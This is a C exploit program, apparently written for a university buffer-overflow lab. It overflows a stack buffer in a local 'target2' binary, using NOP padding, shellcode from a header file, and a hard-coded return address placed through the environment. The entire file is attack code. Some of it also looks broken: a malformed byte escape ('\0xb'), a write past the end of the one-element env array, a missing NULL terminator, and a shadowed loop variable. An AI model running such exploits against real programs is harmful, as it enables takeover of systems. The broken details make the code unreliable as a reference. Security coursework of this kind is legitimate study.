#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define BUFFER_SIZE 271
#define NOP 0x90
#define INV_ADDRESS "\x80\xfd\x21\x30"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char bufferExploit[BUFFER_SIZE];

	memset(bufferExploit, NOP, BUFFER_SIZE);
	memcpy(bufferExploit, shellcode, strlen(shellcode));
	memcpy(bufferExploit+264, "\0xb", 1);
	memcpy(bufferExploit+268, "\x1c\x01", 2);
	bufferExploit[270] = '\0';

	args[0] = TARGET;
	//args[1] = "hi there";
	args[1] = bufferExploit;
	args[2] = NULL;

	char envBufferExploit[13];
	memset(envBufferExploit, NOP, 13);
	int i;
	for (int i = 0; i < 12; i+=4){
		memcpy(envBufferExploit+i, INV_ADDRESS, 4);
	}
	envBufferExploit[12] = '\0';
	env[0] = "";
	env[1] = envBufferExploit;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
